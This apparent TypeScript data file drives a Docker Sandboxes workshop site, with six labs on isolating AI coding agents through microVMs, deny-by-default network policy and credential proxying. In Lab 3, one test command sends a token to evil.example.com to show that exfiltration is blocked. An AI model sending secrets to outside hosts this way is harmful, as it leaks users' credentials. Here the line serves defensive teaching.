import { WORKSHOP_LAB_IDS } from "@/lib/labs";
import { sandboxDocs } from "@/lib/learning-data";

export const workshop = {
  title: "Run AI Agents Safely with Docker Sandboxes",
  duration: "6 hands-on labs",
  docsUrl: "https://docs.docker.com/ai/sandboxes/",
  githubRepoUrl: "https://github.com/kristiyan-velkov/docker-sandbox-workshop",
} as const;

export const labOptions = [
  { value: "all", label: "All labs" },
  ...WORKSHOP_LAB_IDS.map((id) => ({
    value: id,
    label: `Lab ${Number.parseInt(id.replace("lab-", ""), 10)}`,
  })),
] as const;

export const questionLabOptions = [
  { value: "general", label: "General / Q&A" },
  ...WORKSHOP_LAB_IDS.map((id) => ({
    value: id,
    label: `Lab ${Number.parseInt(id.replace("lab-", ""), 10)}`,
  })),
] as const;

export const agenda = [
  { time: "0:00", title: "Welcome & the YOLO problem", duration: "10 min" },
  { time: "0:10", title: "Lab 1 — First sandbox", duration: "25 min" },
  { time: "0:35", title: "Lab 2 — Network policy", duration: "35 min" },
  {
    time: "1:15",
    title: "Lab 3 — Secrets & credential isolation",
    duration: "20 min",
  },
  {
    time: "1:35",
    title: "Labs 4–6 — self-paced (clone, kit, custom kit)",
    duration: "25+ min",
  },
  { time: "1:50", title: "Q&A", duration: "10 min" },
] as const;

export const isolationLayers = [
  {
    name: "Hypervisor",
    description: "Each agent runs in its own microVM with a dedicated kernel.",
  },
  {
    name: "Network",
    description: "Deny-by-default outbound traffic via a host-side proxy.",
  },
  {
    name: "Docker Engine",
    description: "Separate engine inside the VM — never your host daemon.",
  },
  {
    name: "Workspace",
    description: "Your project synced in; git credentials stay on the host.",
  },
  {
    name: "Credential proxy",
    description:
      "API keys injected on outbound HTTPS — never stored in the VM.",
  },
] as const;

export const labs = [
  {
    id: "lab-01",
    title: "Run Your First Sandbox",
    time: "5 min",
    folder: "lab-01-first-sandbox",
    githubPath: "lab-01-first-sandbox",
    description:
      "Install sbx, boot Cursor in a microVM, create files in the workspace, and tear down.",
    docsLinks: [
      { label: "Get started", href: sandboxDocs.getStarted },
      { label: "Cursor agent", href: sandboxDocs.cursor },
      { label: "Usage", href: sandboxDocs.usage },
      { label: "Architecture", href: sandboxDocs.architecture },
      { label: "sbx CLI", href: sandboxDocs.cli },
    ],
    task: `1. Install the sbx CLI and verify the version.
2. Sign in with sbx login.
3. Store your Cursor API key on the host with sbx secret set -g cursor — never put it in a file in this repo.
4. cd into lab-01-first-sandbox/workspace/ and start Cursor with sbx run cursor . --name my-sandbox.
5. Ask the agent to create hello.txt in the workspace and show its contents.
6. Ask the agent to delete ../delete-me.txt and observe why that fails outside the workspace mount.
7. Review sbx policy log and remove the sandbox with sbx rm.

Done when Cursor starts without an API key error, hello.txt exists in workspace/ on the host, delete-me.txt is still present at the lab root, and sbx rm removes my-sandbox from sbx ls.`,
    hints: [
      "Work from lab-01-first-sandbox/workspace/ — mounting the repo root is the most common mistake.",
      "delete-me.txt lives one level above workspace/ — the sandbox only syncs the workspace folder, so the agent cannot remove host files outside that mount.",
      "There is no sbx status — use sbx ls when cleaning up.",
      "If Cursor exits with a CURSOR_API_KEY error: unset CURSOR_API_KEY in your shell, run sbx secret set -g cursor again, then start a new sandbox — global secrets apply at create time.",
      "Create a Cursor API key in Cursor Settings → API. Paste it when sbx secret set -g cursor prompts — it stays in the OS keychain, not in the repo.",
    ],
    steps: [
      {
        label: "Install sbx",
        task: "Trust Docker's Homebrew tap, install sbx, and print the CLI version. Expect a version string with no errors.",
        command:
          "brew trust docker/tap\nbrew install docker/tap/sbx\nsbx version",
      },
      {
        label: "Sign in",
        task: "Authenticate the CLI with your Docker account. Expect a successful login message.",
        command: "sbx login",
      },
      {
        label: "Cursor API key",
        task: "Store your Cursor API key on the host with sbx secret set -g cursor before starting the agent. Expect sbx secret ls to list (global) service cursor. If the agent reports a bad CURSOR_API_KEY from your environment, unset it and store the key again, then create a fresh sandbox.",
        command:
          "sbx secret set -g cursor\nsbx secret ls\n\n# If a stale shell export causes errors:\n# unset CURSOR_API_KEY\n# sbx secret set -g cursor",
      },
      {
        label: "Start sandbox",
        task: "Change into workspace/, then boot Cursor in a named sandbox. Use a second host terminal only for clean up at the end.",
        command:
          "cd lab-01-first-sandbox/workspace\nsbx run cursor . --name my-sandbox",
      },
      {
        label: "Create hello.txt",
        task: 'In Cursor, paste this prompt: "Create a file named hello.txt in this workspace with a one-line greeting, then show me the file contents." Expect hello.txt to appear in workspace/ on the host.',
        command:
          "# Cursor prompt:\nCreate a file named hello.txt in this workspace with a one-line greeting, then show me the file contents.",
      },
      {
        label: "Workspace boundary",
        task: 'In Cursor, paste this prompt: "Try to delete ../delete-me.txt from this workspace. Report whether it worked and explain why sandbox workspace mounts limit what you can change on the host." Expect the file to remain — the agent cannot delete paths outside the synced workspace/.',
        command:
          "# Cursor prompt:\nTry to delete ../delete-me.txt from this workspace. Report whether it worked and explain why sandbox workspace mounts limit what you can change on the host.",
      },
      {
        label: "Clean up",
        task: "Review recent proxy decisions, then force-remove the sandbox. Expect sbx ls to no longer list my-sandbox.",
        command: "sbx policy log --limit 10\nsbx rm my-sandbox --force",
      },
    ],
  },
  {
    id: "lab-02",
    title: "Network Policy",
    time: "10 min",
    folder: "lab-02-network-policy",
    githubPath: "lab-02-network-policy",
    description:
      "Create a sandbox, prove deny-by-default networking, allow www.dockerfrontend.com, and manage sandbox-scoped rules.",
    docsLinks: [
      { label: "Network policy", href: sandboxDocs.governance },
      { label: "Security", href: sandboxDocs.security },
      { label: "sbx CLI", href: sandboxDocs.cli },
    ],
    task: `1. On the host, initialize global balanced policy with sbx policy init balanced. If already initialized, run sbx policy reset first, then init again.
2. cd into lab-02-network-policy/workspace/ and start Cursor with sbx run cursor . --name lab2.
3. Ask Cursor to curl https://www.dockerfrontend.com, show the response, and confirm it is blocked. Validate with sbx policy log lab2.
4. Allow www.dockerfrontend.com on the host, ask Cursor to curl again and show more about the book. Check sbx policy log.
5. Ask the agent to list Docker books on the site with titles and descriptions.
6. Inspect rules with sbx policy ls --type network lab2 (UUID in POLICY/RULE column) and validate traffic with sbx policy log.
7. Deny www.dockerfrontend.com for lab2 only. If a rule already exists, remove it first with sbx policy rm network --id <uuid> --sandbox lab2 (UUID from sbx policy ls, not sbx policy log).
8. Remove sandbox-scoped and global network rules by ID or resource with sbx policy rm, then remove the sandbox.

Done when Cursor shows blocked and allowed responses, sbx policy log confirms each block and allow for www.dockerfrontend.com, sandbox-scoped deny blocks the host again for lab2, and sbx policy ls reflects each rule change.`,
    hints: [
      "Run sbx policy init balanced on the host before sbx run cursor — the sandbox inherits global policy at start.",
      "If init fails with already initialized, run sbx policy reset then sbx policy init balanced again.",
      "Work from lab-02-network-policy/workspace/. Use a second host terminal for sbx policy commands and sbx policy log.",
      "Under balanced policy, www.dockerfrontend.com is blocked until you explicitly allow it.",
      "Ask Cursor to curl and show the full response — a blocked request or policy error means deny worked.",
      "Block a host for one sandbox only: sbx policy deny network --sandbox lab2 ads.example.com",
      "Revoke access for this lab's site: sbx policy deny network --sandbox lab2 www.dockerfrontend.com",
      "Validate blocks and allows on the host with sbx policy log lab2 — shows traffic (HOST, PROXY, RULE), not rule IDs.",
      "Find rule IDs with sbx policy ls --type network lab2 — user-added rules show a UUID in the POLICY/RULE column.",
      "Rules are not updated in place — remove the existing rule first (by ID or --resource), then apply the new one.",
      "Remove by ID: sbx policy rm network --id <uuid> --sandbox lab2 (UUID from POLICY/RULE column in sbx policy ls).",
      "Remove by resource: sbx policy rm network --sandbox lab2 --resource www.dockerfrontend.com",
    ],
    steps: [
      {
        label: "Init balanced policy",
        task: "On the host, set global balanced policy before starting any sandbox. If you see already initialized, reset first, then init again. Expect sbx policy ls to show balanced defaults.",
        command:
          "sbx policy init balanced\nsbx policy ls\n\n# If already initialized:\nsbx policy reset\nsbx policy init balanced\nsbx policy ls",
      },
      {
        label: "Start sandbox",
        task: "Change into workspace/, then boot Cursor with --name lab2. Leave this terminal on the agent; use another terminal for sbx policy commands and sbx policy log.",
        command:
          "cd lab-02-network-policy/workspace\nsbx run cursor . --name lab2",
      },
      {
        label: "Prove default deny",
        task: "Before any allow rule, ask Cursor to curl www.dockerfrontend.com, show the full response, and confirm the URL is blocked by policy. On the host, run sbx policy log lab2 and expect a blocked entry.",
        command:
          "# Cursor prompt:\ncurl https://www.dockerfrontend.com and show me the full response (status code and body). Confirm this URL is blocked by sandbox network policy.\n\n# Validate on the host:\nsbx policy log lab2 --limit 10",
      },
      {
        label: "Allow www.dockerfrontend.com",
        task: "On the host, allow outbound HTTPS to www.dockerfrontend.com. Ask Cursor to curl again and show more about the book on the site. Check sbx policy log — expect an allowed entry.",
        command:
          "sbx policy allow network www.dockerfrontend.com\n\n# Cursor prompt:\ncurl https://www.dockerfrontend.com again and show me more about the book — title, description, and what you find on the page.\n\n# Validate on the host:\nsbx policy log lab2 --limit 10",
      },
      {
        label: "Read the site",
        task: "With www.dockerfrontend.com allowed, ask the agent to list the Docker books on the homepage — titles and short descriptions for each.",
        command:
          "# Cursor prompt:\nList the Docker books on www.dockerfrontend.com — give me the title and a short description for each one you find.",
      },
      {
        label: "Inspect policy",
        task: "sbx policy log lab2 shows traffic audit (HOST, PROXY, RULE) — no IDs. To find rule IDs, run sbx policy ls --type network lab2 — user-added rules show a UUID in the POLICY/RULE column (e.g. 2ed35442-ebf3-4a92-a11e-56cb143969af for www.dockerfrontend.com). Copy that UUID to remove or replace a rule.",
        command:
          "# Traffic audit — validates blocked/allowed requests (no rule IDs):\nsbx policy log lab2 --limit 10\n\n# Rule definitions — UUID in POLICY/RULE column:\nsbx policy ls --type network lab2 | grep dockerfrontend\n\n# Example row:\n# local  sandbox:lab2  2ed35442-ebf3-4a92-a11e-56cb143969af  network  allow  www.dockerfrontend.com\n\n# Remove by ID:\n# sbx policy rm network --id 2ed35442-ebf3-4a92-a11e-56cb143969af --sandbox lab2",
      },
      {
        label: "Sandbox-scoped deny",
        task: "On the host, block www.dockerfrontend.com for lab2 only. If a rule already exists for this host, remove it first — find the UUID in sbx policy ls --type network lab2 (POLICY/RULE column), then sbx policy rm network --id <uuid> --sandbox lab2. Apply the new deny, ask Cursor to curl, and validate with sbx policy log.",
        command:
          "# Find the rule UUID (POLICY/RULE column):\nsbx policy ls --type network lab2 | grep dockerfrontend\n\n# Remove existing rule before changing allow/deny:\n# sbx policy rm network --id 2ed35442-ebf3-4a92-a11e-56cb143969af --sandbox lab2\n\nsbx policy deny network --sandbox lab2 www.dockerfrontend.com\n\n# Cursor prompt:\ncurl https://www.dockerfrontend.com again and show the response. Confirm the request is blocked by policy again.\n\n# Validate traffic on the host:\nsbx policy log lab2 --limit 10",
      },
      {
        label: "Remove rules",
        task: "Remove sandbox-scoped and global network rules for www.dockerfrontend.com, then tear down. Find UUIDs with sbx policy ls --type network lab2 (POLICY/RULE column), or remove by --resource. Expect sbx policy ls to no longer list those hosts.",
        command:
          'sbx policy ls --type network lab2 | grep -E "dockerfrontend|kristiyanvelkov"\n\n# Remove by ID (UUID from POLICY/RULE column):\nsbx policy rm network --id <uuid> --sandbox lab2\n\n# Or remove by resource:\nsbx policy rm network --sandbox lab2 --resource www.dockerfrontend.com\nsbx policy rm network --resource www.dockerfrontend.com\nsbx rm lab2 --force',
      },
    ],
  },
  {
    id: "lab-03",
    title: "Secrets · Security",
    time: "10 min",
    folder: "lab-03-secrets",
    githubPath: "lab-03-secrets",
    description:
      "Store a GitHub token on the host, verify the sentinel inside the VM, and confirm proxy injection for api.github.com.",
    docsLinks: [
      { label: "Credential proxy", href: sandboxDocs.credentials },
      { label: "Authenticated CLI", href: sandboxDocs.workflowsAuthCli },
      { label: "Security", href: sandboxDocs.security },
      { label: "Network policy", href: sandboxDocs.governance },
    ],
    task: `1. Run gh auth status, then pipe your GitHub token to sbx secret set -g github on the host — never put it in a file in this repo.
2. cd into lab-03-secrets/workspace/ and start sbx run cursor . --name lab3.
3. From a second terminal, echo $GH_TOKEN inside the VM — expect a proxy sentinel like gho_sbxproxymanaged…, not your real token. GITHUB_TOKEN is usually unset.
4. curl api.github.com/user from inside the VM using $GH_TOKEN and confirm HTTP 200.
5. Attempt to exfiltrate the sentinel to a blocked host — expect the request to fail.
6. Remove the sandbox with sbx rm lab3.

Done when GH_TOKEN shows a proxy sentinel (gho_sbxproxymanaged…), the GitHub API check returns HTTP 200, exfiltration is blocked, and your real token never appears in terminal output inside the sandbox.`,
    hints: [
      "Requires gh CLI logged in — run gh auth status before sbx secret set -g github.",
      "Store the GitHub secret on the host before sbx run — global secrets apply when the sandbox is created.",
      'Never commit tokens — echo "$(gh auth token)" | sbx secret set -g github stores it on the host only.',
      "The proxy sets GH_TOKEN in the VM — GITHUB_TOKEN is usually unset. Use echo $GH_TOKEN, not GITHUB_TOKEN.",
      "Expected sentinel: gho_sbxproxymanaged… — a placeholder shaped like a token, not your real gho_… value from gh auth token.",
      "API verification must run via sbx exec lab3 — not on the host.",
      "If lab3 does not exist yet: start it with sbx run cursor . --name lab3 from workspace/ first.",
      "Cursor still needs sbx secret set -g cursor from Lab 1 — this lab focuses on the GitHub token proxy.",
      "The exfiltration curl to evil.example.com should be blocked by network policy — the sentinel never leaves via an unapproved host.",
    ],
    steps: [
      {
        label: "Store on host",
        task: "Run gh auth status, then pipe your GitHub token to sbx secret set -g github. Expect the token to stay in the OS keychain — not in the repo.",
        command:
          'gh auth status\necho "$(gh auth token)" | sbx secret set -g github\nsbx secret ls',
      },
      {
        label: "Start sandbox",
        task: "From lab-03-secrets/workspace/, boot Cursor in a named sandbox. Leave this terminal on the agent — use another terminal for sbx exec checks.",
        command: "cd lab-03-secrets/workspace\nsbx run cursor . --name lab3",
      },
      {
        label: "Check sentinel",
        task: "Echo GH_TOKEN inside the running sandbox. Expect a proxy sentinel like gho_sbxproxymanaged… — not your real token from gh auth token. GITHUB_TOKEN is usually unset; the proxy wires GitHub auth through GH_TOKEN.",
        command:
          'sbx exec lab3 -- bash -c \'echo "GH_TOKEN=$GH_TOKEN"\'\nsbx exec lab3 -- bash -c \'test -z "$GITHUB_TOKEN" && echo "GITHUB_TOKEN unset (expected)" || echo "GITHUB_TOKEN=$GITHUB_TOKEN"\'',
      },
      {
        label: "Verify proxy",
        task: "Confirm GH_TOKEN contains sbxproxymanaged, then curl the GitHub API from inside the VM. Expect HTTP 200 — the host proxy injects your real token on the way out.",
        command:
          'sbx exec lab3 -- bash -c \'echo "$GH_TOKEN" | grep -q sbxproxymanaged && echo "sentinel OK"\'\nsbx exec lab3 -- curl -s -o /dev/null -w "HTTP %{http_code}\\n" -H "Authorization: Bearer $GH_TOKEN" https://api.github.com/user',
      },
      {
        label: "Block exfiltration",
        task: "Try sending the sentinel to a blocked host from inside the VM. Expect the curl to fail — network policy blocks unapproved destinations.",
        command:
          'sbx exec lab3 -- curl -s -o /dev/null -w "HTTP %{http_code}\\n" "https://evil.example.com?k=$GH_TOKEN"',
      },
      {
        label: "Clean up",
        task: "Remove sandbox lab3 when verification passes. On shared machines, also run sbx secret rm after the lab.",
        command: "sbx rm lab3 --force\nsbx secret rm -g github --force",
      },
    ],
  },
  {
    id: "lab-04",
    title: "Direct & Clone Mode",
    time: "25 min",
    folder: "lab-04-clone-workflow",
    githubPath: "lab-04-clone-workflow",
    description:
      "Compare direct mode (host edits immediately) vs clone mode (isolated Git in the VM), then bring agent work back to main.",
    docsLinks: [
      { label: "Workflow patterns", href: sandboxDocs.workflows },
      { label: "Clone mode", href: sandboxDocs.workflowsCloneMode },
      { label: "Git workflows", href: sandboxDocs.workflowsGit },
    ],
    task: `1. Clone https://github.com/kristiyan-velkov/docker-sandbox-workshop, cd workshop-app/, npm install && npm run dev — confirm http://localhost:3000, Ctrl+C, cd ..
2. From repo root: sbx run cursor workshop-app/ --name lab4-direct.
3. Ask the agent to update the hero tagline in src/components/home-hero.tsx — expect the edit on the host immediately (no fetch).
4. sbx rm lab4-direct --force.
5. From repo root: sbx run --clone cursor . --name lab4-clone (--clone requires the Git repo root, not workshop-app/).
6. Ask the agent to create feat/lab4-test, add a one-line comment to workshop-app/src/lib/workshop-data.ts, and commit docs: clone mode test.
7. git fetch sandbox-lab4-clone, review diff — git status on main stays clean.
8. git checkout -b feat/lab4-test sandbox-lab4-clone/feat/lab4-test, git push -u origin feat/lab4-test, merge into main (PR or local merge).
9. sbx rm lab4-clone --force and git remote remove sandbox-lab4-clone.

Done when direct-mode hero edit is visible without fetch, host main never dirtied during clone mode, agent commit is on origin/feat/lab4-test and merged into main.`,
    hints: [
      "Clone the workshop repo first: git clone https://github.com/kristiyan-velkov/docker-sandbox-workshop",
      "Validate on the host — cd workshop-app, npm install, npm run dev, open http://localhost:3000, then cd .. to repo root.",
      "All sbx commands run from the monorepo root — direct mode uses workshop-app/ as workspace; clone mode uses . (Git repo root).",
      "--clone on workshop-app/ fails — workshop-app/ is not a Git root. Use sbx run --clone cursor . from repo root.",
      "Direct mode (default) — read-write mount; agent edits appear on the host immediately.",
      "Clone mode (--clone) — private Git clone in the VM; host main stays clean until git fetch sandbox-<name>.",
      "Clone mode is set at create time only — you cannot add --clone to an existing sandbox.",
      "No kit or Supabase setup needed for this lab.",
      "After clone mode, the remote is sandbox-lab4-clone (pattern: sandbox-<your --name>).",
      'Agent prompt (direct): "Update the hero tagline in src/components/home-hero.tsx to mention Docker Sandboxes. Show me the new line."',
      'Agent prompt (clone): "Create branch feat/lab4-test. Add a one-line comment at the top of workshop-app/src/lib/workshop-data.ts noting this was edited in clone mode. Commit with message docs: clone mode test."',
      "Merge: open a PR on GitHub, or git checkout main && git merge feat/lab4-test && git push origin main.",
    ],
    steps: [
      {
        label: "Setup (host)",
        task: "Clone the workshop monorepo, validate workshop-app locally, then return to the repo root for all sbx commands.",
        command:
          "git clone https://github.com/kristiyan-velkov/docker-sandbox-workshop.git\ncd docker-sandbox-workshop/workshop-app\nnpm install && npm run dev\n# confirm http://localhost:3000, Ctrl+C\ncd ..",
      },
      {
        label: "Direct mode",
        task: "From repo root, start Cursor on workshop-app/ — no --clone. The sandbox mounts your working tree read-write; edits sync to the host immediately.",
        command: "sbx run cursor workshop-app/ --name lab4-direct",
      },
      {
        label: "Edit on host",
        task: "Ask the agent to update the hero tagline. Open src/components/home-hero.tsx on the host — the change should already be there (no fetch needed).",
        command:
          "# Cursor prompt:\nUpdate the hero tagline in src/components/home-hero.tsx to mention Docker Sandboxes. Show me the new line.",
      },
      {
        label: "Clean up direct",
        task: "Remove the direct-mode sandbox when done comparing behavior.",
        command: "sbx rm lab4-direct --force",
      },
      {
        label: "Clone mode",
        task: "From repo root, start a new sandbox with --clone on . (Git repo root). The agent gets a private clone of the whole monorepo; your host main stays read-only and untouched.",
        command: "sbx run --clone cursor . --name lab4-clone",
      },
      {
        label: "Agent commits",
        task: "Ask the agent to branch, edit workshop-app/src/lib/workshop-data.ts, and commit inside the VM clone. git status on host main should remain clean.",
        command:
          '# Cursor prompt:\nCreate branch feat/lab4-test. Add a one-line comment at the top of workshop-app/src/lib/workshop-data.ts noting this was edited in clone mode. Commit with message "docs: clone mode test".',
      },
      {
        label: "Fetch & review",
        task: "Fetch the sandbox clone and review before merging. Expect refs under sandbox-lab4-clone/.",
        command:
          "git fetch sandbox-lab4-clone\ngit log sandbox-lab4-clone/feat/lab4-test --oneline -3\ngit diff main..sandbox-lab4-clone/feat/lab4-test\ngit status",
      },
      {
        label: "Push & merge",
        task: "Check out the agent branch, push to origin, and merge into main — via PR on GitHub or a local merge.",
        command:
          "git checkout -b feat/lab4-test sandbox-lab4-clone/feat/lab4-test\ngit push -u origin feat/lab4-test\n# PR: GitHub → merge PR → git checkout main && git pull origin main\n# Local: git checkout main && git merge feat/lab4-test && git push origin main",
      },
      {
        label: "Clean up clone",
        task: "Remove the clone-mode sandbox and sandbox Git remote when review is done.",
        command:
          "sbx rm lab4-clone --force\ngit remote remove sandbox-lab4-clone 2>/dev/null || true",
      },
    ],
  },
  {
    id: "lab-05",
    title: "Run with Kit",
    time: "15 min",
    folder: "lab-05-workshop-app",
    githubPath: "lab-05-workshop-app",
    description:
      "Boot workshop-app with the workshop kit from inside workshop-app/ — test network allow/deny rules and inspect what the kit injects.",
    docsLinks: [
      { label: "Customize", href: sandboxDocs.customize },
      { label: "Kits", href: sandboxDocs.kits },
      { label: "Usage", href: sandboxDocs.usage },
      { label: "Cursor agent", href: sandboxDocs.cursor },
    ],
    task: `1. Use your Lab 4 clone — cd docker-sandbox-workshop. Only git clone if missing.
2. cd workshop-app, copy .env.sandbox.example to .env.local (NEXT_PUBLIC_PLATFORM_URL=http://host.docker.internal:3000).
3. Preflight: test -f package.json && test -f package-lock.json — if missing, run npm install on the host.
4. cd workshop-app && sbx run cursor . --kit ../customize/kit/workshop-app-nextjs --name lab5-kit (must run from inside workshop-app/).
5. Ask the agent to research Kristiyan Velkov on kristiyanvelkov.com and leanpub.com (allowed) — then try Google and LinkedIn (denied). Check sbx policy log.
6. Ask the agent to list what this kit includes — .cursor/rules/, skill, network caps in spec.yaml.
7. curl :3000 → HTTP 200. Tear down when done.

Done when dev server returns 200, allowed-site research works, denied sites fail in policy log, and you can name the kit files and network rules.`,
    hints: [
      "Reuse Lab 4 repo — cd docker-sandbox-workshop. Clone only if missing: git clone https://github.com/kristiyan-velkov/docker-sandbox-workshop.git",
      "Critical: cd workshop-app && sbx run cursor . — do not run sbx run cursor workshop-app/ from repo root (npm ci fails without package.json at workspace root).",
      "Kit uses files/home/ bootstrap + commands.startup — not commands.install (install runs before workspace mount).",
      "Workspace must be workshop-app/ (contains package.json) — cd workshop-app && sbx run cursor .",
      "Kit path from workshop-app/: --kit ../customize/kit/workshop-app-nextjs",
      "Kit network: network.allowedDomains / deniedDomains in spec.yaml (schemaVersion 1).",
      "Allowed prompt: Research Kristiyan Velkov — read kristiyanvelkov.com and list books on leanpub.com.",
      "Denied prompt: Search Google for Kristiyan Velkov and summarize LinkedIn results — expect failures; confirm with sbx policy log lab5-kit.",
      "Kit inventory prompt: List files under .cursor/rules/ and .claude/skills/. Summarize network.allowedDomains and commands.startup from customize/kit/workshop-app-nextjs/spec.yaml.",
      "Kit copies rules to workshop-app/.cursor/rules/ — sandbox-workshop.mdc, project-context.mdc, cursor-agent.mdc, nextjs-app-router.mdc.",
      "workshop-app links to docker-sandbox-platform — NEXT_PUBLIC_PLATFORM_URL=http://host.docker.internal:3000 in .env.local.",
      "Local kit: ../customize/kit/workshop-app-nextjs when cwd is workshop-app/.",
      "Git kit (optional): git+https://github.com/kristiyan-velkov/docker-sandbox-workshop.git#dir=customize/kit/workshop-app-nextjs",
      "sbx ls shows forwarded ports. First boot may take a minute while npm ci runs.",
    ],
    steps: [
      {
        label: "Use existing repo",
        task: "cd into your Lab 4 clone at docker-sandbox-workshop/. Clone from GitHub only if the folder is missing.",
        command:
          "cd docker-sandbox-workshop\n# missing? → git clone https://github.com/kristiyan-velkov/docker-sandbox-workshop.git && cd docker-sandbox-workshop",
      },
      {
        label: "Env on host",
        task: "cd workshop-app, copy .env.sandbox.example to .env.local. NEXT_PUBLIC_PLATFORM_URL points platform links to host :3000.",
        command:
          "cd workshop-app\ncp .env.sandbox.example .env.local\n# NEXT_PUBLIC_PLATFORM_URL=http://host.docker.internal:3000",
      },
      {
        label: "Preflight",
        task: "Confirm package.json and package-lock.json exist before sbx — kit npm ci requires both at workspace root.",
        command:
          "test -f package.json && test -f package-lock.json && echo OK\n# missing lockfile? → npm install on host, then retry",
      },
      {
        label: "Run with kit",
        task: "Start Cursor with the workshop kit. Workspace = workshop-app/ (must contain package.json). Kit bootstraps npm ci via ${WORKDIR} at startup.",
        command:
          "cd workshop-app\nsbx run cursor . --kit ../customize/kit/workshop-app-nextjs --name lab5-kit",
      },
      {
        label: "Network — allowed",
        task: "Ask the agent to research you on allowed domains. Expect kristiyanvelkov.com and leanpub.com to work.",
        command:
          "# Cursor prompt:\nResearch Kristiyan Velkov — read kristiyanvelkov.com for bio and books, check leanpub.com for publications. Summarize what you find.",
      },
      {
        label: "Network — denied",
        task: "Ask the agent to search Google and LinkedIn. Expect blocked requests — confirm with policy log.",
        command:
          "# Cursor prompt:\nSearch Google for Kristiyan Velkov and fetch LinkedIn profile info. Report what worked and what failed.\n\nsbx policy log lab5-kit --limit 15",
      },
      {
        label: "Inspect kit",
        task: "Ask the agent what the kit injected — rules, skill, startup command, network caps.",
        command:
          "# Cursor prompt:\nWhat did the workshop-app-nextjs kit add to this workspace? List .cursor/rules/ and .claude/skills/ files. Summarize network.allowedDomains and commands.startup from customize/kit/workshop-app-nextjs/spec.yaml.\n\nsbx exec lab5-kit -- curl -s -o /dev/null -w '%{http_code}\\n' http://127.0.0.1:3000\nsbx exec lab5-kit -- ls -la .cursor/rules/",
      },
      {
        label: "Optional — Git kit",
        task: "If you need a fresh monorepo from GitHub, run with the Git kit URL. Skip if you already have the local clone.",
        command:
          'sbx rm lab5-kit --force\nsbx run cursor . --kit "git+https://github.com/kristiyan-velkov/docker-sandbox-workshop.git#dir=customize/kit/workshop-app-nextjs" --name lab5-git',
      },
      {
        label: "Clean up",
        task: "Remove the sandbox when verification passes.",
        command: "sbx rm lab5-kit --force",
      },
    ],
  },
  {
    id: "lab-06",
    title: "Create Your Custom Kit",
    time: "25 min",
    folder: "lab-06-customize-stack",
    githubPath: "lab-06-customize-stack",
    description:
      "Copy the kit template, fill in spec.yaml, validate, and run workshop-app with your own mixin kit — final lab.",
    docsLinks: [
      { label: "Customize", href: sandboxDocs.customize },
      { label: "Kits", href: sandboxDocs.kits },
      { label: "Kit reference", href: sandboxDocs.kits },
      { label: "Run agents", href: sandboxDocs.agents },
    ],
    task: `1. From docker-sandbox-workshop (Lab 4 clone), cp -r lab-06-customize-stack/kit-template ./my-workshop-kit.
2. Fill in spec.yaml — name, network.allowedDomains, environment, commands.startup (per kit-reference).
3. Edit files/workspace/.claude/skills/my-workshop-kit/SKILL.md with your team rules.
4. sbx kit validate ./my-workshop-kit until clean.
5. cd workshop-app && sbx run cursor . --kit ../my-workshop-kit --name lab6-my-kit.
6. curl :3000 → HTTP 200. Ask the agent to read your kit skill and summarize your rules.

Done when validate passes, your kit boots the dev server, and you can explain each spec.yaml block.`,
    hints: [
      "Never edit lab-06-customize-stack/kit-template/ in place — copy to ./my-workshop-kit first.",
      "schemaVersion: \"1\" + kind: mixin — extends cursor without a custom sandbox kit.",
      "network.allowedDomains — outbound allow-list; network.deniedDomains — explicit blocks (deny wins).",
      "files/home/ — bootstrap script (npm ci + dev server); commands.startup runs it in background.",
      "commands.install — for agent installs (curl | bash) at create time, not npm in mounted workspaces.",
      "files/workspace/ — static files copied into the synced workspace (skills, rules, .env examples).",
      "If you change name in spec.yaml, rename the skill folder under files/workspace/.claude/skills/ to match.",
      "Keep ./my-workshop-kit/ after the lab — reuse with --kit on any project.",
    ],
    steps: [
      {
        label: "Copy kit template",
        task: "Copy the Lab 6 kit template to my-workshop-kit/ at repo root. Inspect spec.yaml and files/ before editing.",
        command:
          "cd docker-sandbox-workshop\ncp -r lab-06-customize-stack/kit-template ./my-workshop-kit\nls my-workshop-kit/",
      },
      {
        label: "Fill in spec.yaml",
        task: "Set your kit name, network.allowedDomains, env vars, and skill. See lab GUIDE.md for the blank template reference.",
        command:
          "cat my-workshop-kit/spec.yaml\n# See lab-06-customize-stack/GUIDE.md — Blank template reference",
      },
      {
        label: "Customize & validate",
        task: "Edit the skill SKILL.md, then validate until zero errors.",
        command:
          "sbx kit validate ./my-workshop-kit\nsbx kit inspect ./my-workshop-kit",
      },
      {
        label: "Run your kit",
        task: "Launch Cursor on workshop-app/ with your custom kit. Wait for npm ci and background dev server.",
        command:
          "cp workshop-app/.env.sandbox.example workshop-app/.env.local\ncd workshop-app\nsbx run cursor . --kit ../my-workshop-kit --name lab6-my-kit",
      },
      {
        label: "Verify",
        task: "Confirm HTTP 200, kit skill in workspace, and agent reads your kit instructions.",
        command:
          "sbx ls\nsbx exec lab6-my-kit -- curl -s -o /dev/null -w '%{http_code}\\n' http://127.0.0.1:3000\nsbx exec lab6-my-kit -- test -f .claude/skills/my-workshop-kit/SKILL.md && echo \"skill OK\"\n# Cursor prompt: Read .claude/skills/my-workshop-kit/SKILL.md and summarize my kit rules.",
      },
      {
        label: "Clean up",
        task: "Remove the sandbox. Keep ./my-workshop-kit/ for future projects.",
        command: "sbx rm lab6-my-kit --force",
      },
    ],
  },
] as const;

export const yoloPoints = [
  {
    title: "The problem",
    body: "YOLO mode lets agents run shell commands, install packages, and edit files without asking. Powerful — and dangerous on your host.",
  },
  {
    title: "The sbx answer",
    body: "sbx run cursor . boots a microVM. The agent goes full YOLO inside the sandbox. Your host, keys, and Docker daemon stay untouched.",
  },
  {
    title: "Default posture",
    body: "Network deny-by-default, credential proxy injection, isolated Docker Engine, and full teardown with sbx rm.",
  },
] as const;

export function labGithubUrl(githubPath: string) {
  return `${workshop.githubRepoUrl}/tree/main/${githubPath}`;
}

export function labGuideGithubUrl(githubPath: string) {
  return `${workshop.githubRepoUrl}/blob/main/${githubPath}/GUIDE.md`;
}

export function labReadmeGithubUrl(githubPath: string) {
  return `${workshop.githubRepoUrl}/blob/main/${githubPath}/README.md`;
}
